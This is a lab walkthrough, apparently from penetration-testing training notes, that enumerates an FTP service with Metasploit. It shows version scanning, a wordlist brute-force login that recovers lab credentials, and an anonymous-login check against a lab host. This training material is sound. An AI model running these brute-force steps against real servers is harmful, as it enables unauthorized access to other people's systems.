# FTP Enumeration

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 4242–4278. Examples are lab-specific and need verification.

FTP (File Transfer Protocol) is a standard network protocol used for transferring files from one host to another over a network. FTP operates in a client-server architecture, where the client initiates a connection to the server to perform file operations.

This lab covers the process of performing FTP enumeration with Metasploit.

n this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Your task is to perform FTP enumeration with Metasploit.

**Tools: msf, FTP client , port 21**

```bash
msfconsole
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run

use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run

#As shown in the following screenshot, the brute force attack identifies the credentials sysadmin:654321
#We can also check if anonymous logons are allowed on the FTP server, this can be done by using the following commands:

use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run

ftp demo.ine.local
#As shown in the following screenshot, you will be prompted to provide a username and password, supply the credentials we obtained from the brute force attack.
```

In this lab, we explored the process of performing FTP enumeration with the Metasploit Framework.
